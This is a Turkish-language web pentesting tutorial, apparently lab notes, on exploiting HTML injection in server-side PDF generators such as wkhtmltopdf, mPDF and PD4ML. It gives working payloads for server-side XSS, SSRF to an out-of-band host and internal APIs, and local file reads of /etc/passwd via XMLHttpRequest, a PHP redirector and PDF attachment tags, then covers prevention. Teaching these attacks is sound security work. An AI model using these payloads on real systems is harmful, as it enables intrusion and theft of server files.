---
{"dg-publish":true,"permalink":"/web-pentest-expert/pdf-generation-vulnerabilities/"}
---

Birçok web uygulaması, örneğin faturalar veya raporlar için PDF oluşturma işlevi sağlar. Bu PDF'lerin çoğu dinamik kullanıcı girdisi içerir. Sonraki birkaç bölümde, PDF oluşturma kütüphaneleri için girdiye HTML enjeksiyonu nedeniyle güvenlik açıklarına neden olabilecek yanlış yapılandırmaları ve hataları tartışacağız.


## PDF Generation

Portable Document Format (PDF), platformdan bağımsız **document** sunumu sağlamak için geliştirilmiş bir dosya formatıdır. PDF dosyaları birçok uygulamada yaygın olarak kullanıldığından, **PDF generation** web uygulamalarında sıkça kullanılan bir işlevdir.

Web uygulamaları **PDF generation** işlemini gerçekleştirebilmek için genellikle **PDF generation libraries** veya **plugins** kullanır. Ancak, yanlış yapılandırmalar, eksik güvenlik önlemleri ve güncellenmemiş **libraries**, güvenlik açıklarına yol açabilir. Bu tür açıklar, genellikle kötü niyetli kullanıcıların zararlı girdiler sağlayarak uygun şekilde filtrelenmemesinden kaynaklanır.

Örnek olarak, web uygulamalarında yaygın olarak kullanılan bazı **PDF generation libraries** şunlardır:

- TCPDF
- html2pdf
- mPDF
- DomPDF
- PDFKit
- wkhtmltopdf
- PD4ML

Web uygulamalarının oluşturulan PDF dosyalarının tasarımını belirleyebilmesi gerektiğinden, bu **libraries** genellikle **HTML** kodunu girdi olarak kabul eder ve nihai **PDF file** oluşturmak için kullanır. Böylece web uygulamaları, **CSS** kullanarak **HTML** içeriği üzerinden PDF tasarımını kontrol edebilir. Bu **libraries**, **HTML** kodunu ayrıştırır, render eder ve ardından **PDF** oluşturur.

## Example: wkhtmltopdf

PDF oluşturucuların nasıl çalıştığına bir örnek olarak, önceden derlenmiş bir binary dosyasını [buradan](https://wkhtmltopdf.org/downloads.html) indirebileceğiniz wkhtmltopdf'ye bakacağız. Sayfanın üst kısmında, ilerleyen bölümlerde tartışacağımız güvenlik açıklarını ima eden kalın bir güvenlik uyarısı olduğuna dikkat edin:

```
Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS, otherwise it can lead to complete takeover of the server it is running on!


wkhtmltopdf'yi güvenilmeyen HTML ile kullanmayın - kullanıcı tarafından sağlanan HTML/JS'yi sterilize ettiğinizden emin olun, aksi takdirde üzerinde çalıştığı sunucunun tamamen ele geçirilmesine neden olabilir!


```


Wkhtmltopdf'i indirdikten sonra Debian tabanlı Linux dağıtımlarında aşağıdaki komutu kullanarak kurabiliriz:

```shell-session
[!bash!]$ sudo dpkg -i wkhtmltox_0.12.6.1-2.bullseye_amd64.deb
```

wkhtmltopdf'yi -h seçeneği ile çalıştırmak aracın yardım bilgilerini görüntüleyecektir:

```shell-session
[!bash!]$ wkhtmltopdf -h

Name:
  wkhtmltopdf 0.12.6.1 (with patched qt)

Synopsis:
  wkhtmltopdf [GLOBAL OPTION]... [OBJECT]... <output file>

<SNIP>
```

wkhtmltopdf'e bir URL sağladığınızda, web sitesini otomatik olarak getirecek ve PDF'ye dönüştürecektir:

```shell-session
[!bash!]$ wkhtmltopdf https://academy.hackthebox.com/ htb.pdf

Loading pages (1/6)
Counting pages (2/6)                                               
Resolving links (4/6)                                                       
Loading headers and footers (5/6)                                           
Printing pages (6/6)
Done
```

Ortaya çıkan PDF'ye baktığımızda, PDF sayfalarına sığacak şekilde yeniden boyutlandırılmış olmasına rağmen HackTheBox Academy web sitesini tanıyabiliriz:

![Pasted image 20250213185349.png](/img/user/resimler/Pasted%20image%2020250213185349.png)

Ayrıca, bir web uygulamasındaki PDF oluşturma kütüphanesinin ne yaptığını daha yakından simüle etmek için araca lokal bir HTML dosyası sağlayabiliriz. Örnek olarak aşağıdaki HTML dosyasını kullanalım:

```html
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <h1>Hello World!</h1>
        <p>This is some text.</p>
    </body>
</html>
```

Artık **HTML file** üzerinde **wkhtmltopdf** çalıştırarak eşdeğer bir **PDF** üretebiliriz:

```shell-session
[!bash!]$ wkhtmltopdf ./index.html test.pdf

Loading pages (1/6)
Counting pages (2/6)                                               
Resolving links (4/6)                                                       
Loading headers and footers (5/6)                                           
Printing pages (6/6)
Done
```

![Pasted image 20250213185437.png](/img/user/resimler/Pasted%20image%2020250213185437.png)

Gerçek dünyadaki bir web uygulamasının **PDF generation** işlemini nasıl kullanabileceğini simüle etmek için, sipariş tamamlandıktan sonra müşterilere **PDF invoice** sağlayan bir **online shop** örneğini ele alalım. Bu işlem, bir **PDF generation library** kullanılarak kolayca gerçekleştirilebilir.

Örneğin, [buradan](https://github.com/sparksuite/simple-html-invoice-template) açık kaynaklı bir **invoice HTML template** indirelim. Daha sonra, **wkhtmltopdf** çalıştırarak **HTML code** ve özel **CSS** kullanarak bir **PDF invoice** oluşturabiliriz.

Oluşturulan **PDF** şu şekilde görünmektedir:

![Pasted image 20250213185526.png](/img/user/resimler/Pasted%20image%2020250213185526.png)

## Analysis of PDF Files

Hangi **PDF generation library**'nin kullanıldığını belirlememiz gerekir, çünkü belirli **vulnerabilities** ve **misconfigurations** hedef almak için bu bilgi önemlidir. Neyse ki, çoğu **library**, oluşturulan **PDF**'nin **metadata** kısmına bilgiler ekler ve bu sayede kullanılan **library**'yi tespit edebiliriz.

Bu nedenle, analiz için web uygulaması tarafından üretilmiş bir **PDF** ele geçirmemiz yeterlidir. Bir **PDF file**'ın **metadata** bilgilerini görüntülemek için **exiftool** aracını kullanabiliriz. **exiftool**, şu şekilde kurulabilir:

```shell-session
[!bash!]$ apt install libimage-exiftool-perl
```

exiftool'u -h seçeneği ile çalıştırmak aracın yardım bilgilerini görüntüleyecektir:

```shell-session
[!bash!]$ exiftool -h

Syntax:  exiftool [OPTIONS] FILE

Consult the exiftool documentation for a full list of options
```

Bir **generated PDF file** üzerinde **exiftool** çalıştırdığımızda, **creator** ve **producer** **metadata fields**, kullanılan **PDF generation library** ve spesifik versiyonu hakkında bize daha fazla bilgi sağlar. Bu örnekte, **wkhtmltopdf 0.12.6.1** ve **Qt 4.8.7** bilgilerine ulaşabiliriz:

```shell-session
[!bash!]$ exiftool invoice.pdf

ExifTool Version Number         : 12.16
File Name                       : invoice.pdf
Directory                       : .
File Size                       : 18 KiB
File Modification Date/Time     : 2023:03:13 20:42:24+01:00
File Access Date/Time           : 2023:03:13 20:42:24+01:00
File Inode Change Date/Time     : 2023:03:13 20:42:24+01:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : A simple, clean, and responsive HTML invoice template
Creator                         : wkhtmltopdf 0.12.6.1
Producer                        : Qt 4.8.7
Create Date                     : 2023:03:13 20:42:24+01:00
Page Count                      : 1
```

Bu, PDF oluşturma kütüphanesinin belirli bir sürümü için güvenlik açıklarını aramamızı sağlar. Alternatif olarak, aynı görevi gerçekleştirmek için pdfinfo aracını da kullanabiliriz:

```shell-session
[!bash!]$ pdfinfo invoice.pdf 

Title:          A simple, clean, and responsive HTML invoice template
Creator:        wkhtmltopdf 0.12.6.1
Producer:       Qt 4.8.7
CreationDate:   Mon Mar 13 20:42:24 2023 CET
Tagged:         no
UserProperties: no
Suspects:       no
Form:           none
JavaScript:     no
Pages:          1
Encrypted:      no
Page size:      595 x 842 pts (A4)
Page rot:       0
File size:      18488 bytes
Optimized:      no
PDF version:    1.4
```

İşte farklı bir kütüphane (dompdf) tarafından oluşturulan bir PDF üzerinde exiftool'dan başka bir örnek çıktı:

```shell-session
[!bash!]$ exiftool file.pdf

ExifTool Version Number         : 12.16
File Name                       : file.pdf
Directory                       : .
File Size                       : 1071 bytes
File Modification Date/Time     : 2023:03:13 20:45:10+01:00
File Access Date/Time           : 2023:03:13 20:45:10+01:00
File Inode Change Date/Time     : 2023:03:13 20:45:14+01:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : dompdf 2.0.3 + CPDF
Create Date                     : 2023:03:13 12:45:05-07:00
Modify Date                     : 2023:03:13 12:45:05-07:00
```


# Exploitation of PDF Generation Vulnerabilities

Web uygulamalarının **PDF generation libraries**'i nasıl ve neden kullandığını tartıştıktan sonra, şimdi bu **libraries**'de ortaya çıkan **vulnerabilities** ve bunlara neden olan **misconfigurations** üzerinde duralım.

Tüm bu **vulnerabilities**, kullanıcı tarafından sağlanan içeriğin **PDF generator**'ün **HTML input** kısmına eklenmesini gerektirir.


## JavaScript Code Execution

İnceleyeceğimiz ilk **exploit**, **JavaScript injection** olacaktır, çünkü **injected JavaScript code**'un çalıştırılması, daha ileri saldırı vektörlerini mümkün kılar. **PDF generation library**, **HTML input**'u render ettiği için, **injected JavaScript code** çalıştırılabilir.

Ayrıca, **PDF generation library** sunucu üzerinde çalıştığından, **payload** da sunucu tarafında çalıştırılacaktır. Bu nedenle, bu tür bir **vulnerability**, **Server-Side XSS** olarak adlandırılır.

**Server-Side XSS**'i göstermek için, örnek bir **note-taking web application** inceleyelim:

![Pasted image 20250213190217.png](/img/user/resimler/Pasted%20image%2020250213190217.png)

Bu saldırının gerçekleşmesi için tek gereken, **HTML code injection** yeteneğidir. Bu nedenle, **PDF generation library**'nin sağladığımız **HTML code**'u nasıl yorumladığını test edeceğiz.

Öncelikle, **HTML payload** içeren basit bir **bold tag** ile yeni bir **note** oluşturacağız:

![Pasted image 20250213190248.png](/img/user/resimler/Pasted%20image%2020250213190248.png)

Web uygulaması **HTML payload**'ı doğru şekilde **escape** ettiği için, taglar arasındaki metin **bold** hale gelmemiştir. Bu da, uygulamanın klasik **XSS attacks**'e karşı güvenli olduğunu gösterir.

Ancak, bir **PDF** oluşturduğumuzda, notun içeriğinde taglar arasındaki metnin **bold** hale geldiğini görebiliriz. Bu durum, **PDF generation library**'nin **HTML injection**'a ve potansiyel olarak **Server-Side XSS**'e karşı savunmasız olduğunu göstermektedir:

![Pasted image 20250213190357.png](/img/user/resimler/Pasted%20image%2020250213190357.png)

İkinci adımda, sunucunun **injected JavaScript code**'u çalıştırıp çalıştırmadığını doğrulamamız gerekiyor. Aşağıdaki gibi bir **payload** kullanabiliriz:

```javascript
<script>document.write('test1')</script>
```

Bir **PDF** oluşturduktan sonra, **PDF**'de **test1** string'ini görebiliriz. Bu durumda, **backend** **injected JavaScript code**'umuzu çalıştırmış ve **PDF**'i oluşturmadan önce **DOM**'a bu string'i yazmıştır.

![Pasted image 20250213190457.png](/img/user/resimler/Pasted%20image%2020250213190457.png)

Basit bir ilk **exploit** olarak, web sunucusundaki bir yolu sızdıran bir **information disclosure** gerçekleştirelim. Bunu aşağıdaki **payload** ile yapabiliriz:

```javascript
<script>document.write(window.location)</script>
```

**window.location** özelliği, **JavaScript context**'inin mevcut konumunu saklar. Çünkü bu, sunucunun dosya sistemindeki local bir dosya olduğundan, oluşturulan **PDF files**'ların depolandığı sunucudaki local yolu görüntüler:

![Pasted image 20250213190543.png](/img/user/resimler/Pasted%20image%2020250213190543.png)

**JavaScript**'in çalıştırılması, daha ileri ve daha ciddi **vulnerabilities**'ye yol açabilir. Bunları, bir sonraki alt bölümlerde tartışacağız.


## Server-Side Request Forgery

**PDF generation** ile en sık karşılaşılan **vulnerabilities**'lerden biri **Server-Side Request Forgery (SSRF)**'dir. Çünkü **HTML documents** genellikle stiller veya resimler gibi kaynakları external kaynaklardan yükler, bu da bir **HTML document**'in görüntülenmesinin, sunucunun bu external kaynaklardan almak için istekler göndermesini gerektirdiği anlamına gelir. **PDF generator**'ün **input** kısmına keyfi **HTML code**'u enjekte edebileceğimiz için, sunucuyu seçtiğimiz herhangi bir **URL**'ye, hatta iç web uygulamalarına bile **GET request** göndermeye zorlayabiliriz.

Sunucuyu bir **HTTP request** göndermeye zorlamak için birçok farklı **HTML tag**'i enjekte edebiliriz. Örneğin, **SSRF**'yi doğrulamak için kontrolümüzdeki bir **URL**'ye işaret eden bir **img tag**'i enjekte edebiliriz. Bir örnek olarak, **[Interactsh](https://app.interactsh.com/)**'den bir **domain** kullanarak **img tag**'ini kullanacağız:

```html
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
```

Benzer şekilde, bağlantı tag'ini kullanarak bir stil sayfası da enjekte edebiliriz:

```html
<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
```

Genellikle, resimler ve stiller için, yanıt **generated PDF**'de görüntülenmez, bu da **blind SSRF vulnerability**'sine yol açar ve bu da onu **exploit** etme yeteneğimizi kısıtlar. Ancak, **PDF generation library**'nin (yanlış) yapılandırılmasına bağlı olarak, bir **request** tetikleyebilecek ve sunucunun yanıtı görüntülemesini sağlayacak başka **HTML elements**'leri enjekte edebiliriz. Bunun bir örneği **iframe**'dir:

```html
<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
```

Üç **payload**'ını enjekte edip bir **PDF** oluşturduğumuzda, **Interactsh domains**'imize üç istek gönderilir ve böylece tüm üç **payload** ile **SSRF**'yi başarılı bir şekilde doğrulamış oluruz:

![Pasted image 20250213190834.png](/img/user/resimler/Pasted%20image%2020250213190834.png)

Ayrıca, oluşturulan PDF'ye baktığımızda, enjekte edilen iframe'in Interactsh tarafından gönderilen HTTP yanıtını içerdiğini görebiliriz:

![Pasted image 20250213190849.png](/img/user/resimler/Pasted%20image%2020250213190849.png)

Bu durumda, **blind SSRF vulnerability**'mız yok, aksine **regular SSRF**'miz var, ki bu çok daha ciddi bir **vulnerability**'dir çünkü veriyi daha kolay sızdırmamıza olanak tanır. Örneğin, herhangi bir **internal endpoint**'e istek yapabiliriz ve yanıtı bizim için görüntüleyebiliriz. Bir örnek olarak, iç bir **API**'den veriyi şu şekilde sızdırabiliriz:

```html
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
```

Oluşturulan PDF, iç API'den gelen yanıtı içerir ve potansiyel olarak dışarıdan erişemediğimiz hassas bilgileri bize ifşa eder:

![Pasted image 20250213190938.png](/img/user/resimler/Pasted%20image%2020250213190938.png)

## Local File Inclusion

**PDF generation libraries** yardımıyla potansiyel olarak **exploit** edebileceğimiz bir diğer güçlü **vulnerability** ise **Local File Inclusion (LFI)**'dir. Sunucudaki local dosyaları okumak için enjekte etmeyi deneyebileceğimiz birçok **HTML element**'i vardır.


#### With JavaScript Execution

Eğer sunucu **injected JavaScript**'imizi çalıştırırsa, **[XmlHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)** ve **file protocol** kullanarak local dosyaları okuyabiliriz, bu da aşağıdaki gibi bir **payload**'a yol açar:

```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

Bu JavaScript kodunu enjekte ederek, oluşturulan PDF'de passwd dosyasının içeriğini görebiliriz:

![Pasted image 20250213191423.png](/img/user/resimler/Pasted%20image%2020250213191423.png)

Ancak, bazı dosyalar için bu pratik değildir çünkü **PDF file**'dan veri çıkarmak dosyayı bozabilir. Örneğin, bir **SSH key**'i sızdırmaya çalışırsak, **syntax** büyük olasılıkla bozulur. Ayrıca, bu şekilde **binary data** içeren dosyaları sızdırmamız mümkün değildir. Bu nedenle, dosyayı **PDF**'e yazmadan önce **btoa** fonksiyonu kullanarak **base64** ile kodlamamız gerekir:

```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

Ancak, bunu yapmak, **PDF page**'ine sığmayan tek bir uzun satır oluşturur. Genellikle, **PDF generation library** satır sonları eklemez, bu da satırın sayfanın sonuna gelmeden kesilmesine yol açar:

![Pasted image 20250213191522.png](/img/user/resimler/Pasted%20image%2020250213191522.png)

**Payload**'ımızı, **PDF page**'ine sığması için her 100 karakterde bir **linebreak** enjekte edecek şekilde kolayca değiştirebiliriz:

```html
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

Bunu yaptıktan sonra, dosyayı sorunsuz bir şekilde alabiliriz. Artık **base64-encoded** veriyi kopyalayıp, **linebreak**'leri göz ardı eden herhangi bir araçla, örneğin **[CyberChef](https://gchq.github.io/CyberChef/)** ile çözebiliriz:

![Pasted image 20250213191613.png](/img/user/resimler/Pasted%20image%2020250213191613.png)

#### Without JavaScript Execution

Eğer **backend** **injected JavaScript** kodumuzu çalıştırmazsa, local dosyaları görüntülemek için başka **HTML tags** kullanmamız gerekir. Aşağıdaki **payload**'ları deneyebiliriz:

```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

Ancak, bunu test ortamımızda yapmak, sadece boş bir **iframe**'in görüntülenmesine yol açar:

![Pasted image 20250213191653.png](/img/user/resimler/Pasted%20image%2020250213191653.png)

Neyse ki, **iframes** ile kombinasyon halinde yapabileceğimiz bir başka numara daha var. Daha önce **SSRF** bölümünde tartışıldığı gibi, bazı **PDF generation libraries** isteklerin yanıtlarını **iframe**'lerde görüntüler. Ancak, yukarıdaki ekran görüntüsünde de görebileceğimiz gibi, bazen **iframe**'leri kullanarak dosyalara doğrudan erişim sağlayamayız. Yine de, **src attribute**'unu kullanarak, gelen istekleri local bir dosyaya yönlendiren ve kontrolümüz altındaki bir sunucuya işaret eden bir çözüm kullanabiliriz. Eğer **library** yanlış yapılandırılmışsa, dosyayı görüntüleyebilir. Bunu yapmak için sunucumuzda aşağıdaki **PHP script**'ini çalıştırabiliriz. Bu script, gelen tüm istekleri bir **HTTP 302 redirect** yanıtıyla karşılar ve **Location header**'ını **file protocol** kullanarak local bir dosyaya ayarlar:

```php
<?php header('Location: file://' . $_GET['url']); ?>
```

Daha sonra, **IP**'nin yönlendirme script'ini çalıştırdığımız sunucuya işaret ettiği aşağıdaki **payload**'ı enjekte edebiliriz:

```html
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

Bunu yaptıktan sonra, oluşturulan PDF artık sızdırılmış dosyayı içerir:

![Pasted image 20250213191817.png](/img/user/resimler/Pasted%20image%2020250213191817.png)


#### Ek Açıklamalar

Daha önce local dosyaların **PDF pages**'ine nasıl dahil edileceğini tartışmış olsak da, **PDF files** gelişmiş özellikler destekler, örneğin **annotations** ve **attachments**, bunları da sunucudaki local dosyaları sızdırmak için kullanabiliriz. Bu, daha önce tartışılan **payload**'lar işe yaramazsa özellikle ilginçtir.

Örneğin, **annotations** özelliğini destekleyen **mPDF** PDF generation library'sini ele alalım. **Annotations**'ı kullanarak, aşağıdaki gibi bir **payload** enjekte ederek dosyaları oluşturulan PDF dosyasına ekleyebiliriz:

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

Oluşturulan **PDF file**'ına baktığımızda, ekli dosya ile birlikte **annotation**'ı görebiliriz. Eklemeye tıkladığımızda, ekli olan **/etc/passwd** dosyasını açar:

![Pasted image 20250213191945.png](/img/user/resimler/Pasted%20image%2020250213191945.png)

Bu [**GitHub Issue**](https://github.com/mpdf/mpdf/issues/356)'unda görebileceğimiz gibi, **mPDF 6.0**'dan sonra **annotations** devre dışı bırakılmıştır. Dolayısıyla, eski bir **mPDF** sürümünü kullanan web uygulamaları büyük olasılıkla buna karşı savunmasızdır. Ancak, **mPDF**'in yeni sürümlerinde bu seçenek hala etkinleştirilebilir. Bu nedenle, güncel **mPDF** sürümleri kullanan web uygulamalarını test etmek de faydalıdır.

**Attachments**'ı destekleyen bir diğer **PDF generation library** ise **PD4ML**'dir. Söz konusu söz dizimini **[dokümantasyon](https://pd4ml.tech/support-topics/usage-examples/#add-attachment)**'dan kontrol edebiliriz. Bir **proof-of-concept** olarak, aşağıdaki **payload**'ı kullanabiliriz:

```html
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```

Yine, oluşturulan **PDF file**'ına baktığımızda, ekli dosya ile birlikte **annotation**'ı görebiliriz:

![Pasted image 20250213192058.png](/img/user/resimler/Pasted%20image%2020250213192058.png)

Daha önce olduğu gibi, **annotation**'a tıkladığımızda dosya açılır. Görülebileceği gibi, hedef web uygulamamızda kullanılan belirli **PDF generation library**'nin **dokümantasyon**unu okumak, potansiyel olarak exploit edebileceğimiz herhangi bir işlevsellik olup olmadığını görmek için önemlidir. Local dosyalara erişimi mümkün kılan **pd4ml:attachment** gibi özel taglar özellikle ilginçtir.


# Prevention of PDF Generation Vulnerabilities

PDF generation kütüphanelerindeki **HTML injection** güvenlik açıklarını nasıl exploit edebileceğimizi tartıştıktan sonra, bu tür güvenlik açıklarını önlemenin yollarını tartışalım.


## Insecure Configurations

Önceki bölümlerde tartıştığımız birçok güvenlik açığı, PDF oluşturma kütüphanelerinin yanlış yapılandırılmasından kaynaklanmaktadır. Bu kütüphanelerin varsayılan ayarlarının güvenli olmadığı birçok durum vardır. Birçoğu keşfedilmiş ve düzeltilmiş olsa da, varsayılan ayarların güvenliğine güvenmemeliyiz. Bu nedenle, belgeleri okumak, yapılandırma dosyasını incelemek ve PDF oluşturma kütüphanesini ihtiyaçlarımıza göre yapılandırmak oldukça önemlidir. Örneğin, birçok PDF oluşturma kütüphanesi, dış kaynaklara erişime izin verecek şekilde varsayılan olarak yapılandırılmıştır. Bu seçeneği false olarak ayarlamak, SSRF güvenlik açıklarını etkili bir şekilde engeller. DomPDF kütüphanesinde, bu seçenek `enable_remote` olarak adlandırılır.

Bazı kütüphanelerde ise, JavaScript ve hatta PHP kodunun sunucuda çalıştırılmasına izin veren başka yapılandırma seçenekleri bulunur. Bu özellikleri kullanmak, PDF dosyalarının dinamik olarak oluşturulması için faydalı olabilir, ancak aynı zamanda son derece tehlikelidir, çünkü PHP kodu enjeksiyonu remote code çalıştırmaya (RCE) yol açabilir. Örneğin, DomPDF kütüphanesinde, PHP kodu çalıştırılmasına izin veren `isPhpEnabled` adında bir yapılandırma seçeneği vardır; bu seçenek, güvenlik riski oluşturduğu için devre dışı bırakılmalıdır.

Genel olarak, çoğu kütüphane, kullanırken takip etmemiz gereken güvenlik en iyi uygulamalarını sağlar. [Örneğin](https://github.com/dompdf/dompdf/wiki/Securing-dompdf), işte DomPDF için güvenlik en iyi uygulamaları.

## Prevention

Daha önce tartıştığımız tüm güvenlik açıkları, kullanıcı tarafından sağlanan HTML etiketlerinin PDF oluşturma kütüphanesine girdi olarak verilmesinden kaynaklanmaktadır. Bir web uygulaması, kullanıcı girdisinde HTML etiketlerine izin vermeyerek bu güvenlik açıklarını engelleyebilir. Bu, örneğin PHP'deki `htmlentities` fonksiyonu kullanılarak, kullanıcı girdisinin HTML-entity kodlaması yapılmasıyla gerçekleştirilebilir. `htmlentities`, geçerli tüm karakterleri HTML varlıklarına dönüştürür, örneğin `<` karakterini `&lt;` ve `>` karakterini `&gt;` olarak değiştirir, böylece herhangi bir HTML tagı enjeksiyonu mümkün olmaz ve güvenlik sorunları engellenmiş olur.

Ancak, birçok durumda bu çözüm aşırı kısıtlayıcı olabilir çünkü kullanıcıların bazı stil öğelerini (örneğin kalın veya italik metin) ya da kaynakları (örneğin resimler) eklemeleri istenebilir. Bu durumda, kullanıcıların HTML etiketlerini PDF oluşturma girdisine eklemeleri gerekebilir. Daha önce tartıştığımız güvenlik açıklarını engellemek için, PDF oluşturma kütüphanesinin yapılandırma seçeneklerini doğru şekilde yapılandırarak tüm güvenlik sorunlarını göz önünde bulundurmalıyız. En azından, aşağıdaki ayarların doğru şekilde yapılandırıldığından emin olmamız gerekir:

- JavaScript kodu hiçbir koşulda çalıştırılmamalıdır.
- Local dosyalara erişim engellenmelidir.
- Dış kaynaklara erişim engellenmeli ya da gerektiği durumlarda sınırlanmalıdır.

Birçok durumda, HTML kodu dış kaynaklara (örneğin resimler ve stil sayfaları gibi) dayanır. Eğer bunlar şablonun bir parçasıysa, web uygulaması bu kaynakları önceden almalı ve local olarak depolamalıdır. Daha sonra, HTML öğelerini bu kaynakların local kopyalarına işaret edecek şekilde düzenleyebiliriz, böylece dış kaynaklar yüklenmez. Bu, web uygulamasını çalıştıran web sunucusunun tüm çıkış isteklerini engelleyen katı güvenlik duvarı kuralları ayarlamamıza olanak tanır. Bu, SSRF güvenlik açıklarını tamamen engeller. Ancak, kullanıcıların dış kaynakları yüklemeleri gerekiyorsa, dış endpointler için bir whitelist yaklaşımı uygulanması önerilir. Bu, iç ağa erişimi engelleyerek SSRF güvenlik açıklarının kullanılmasını engeller.
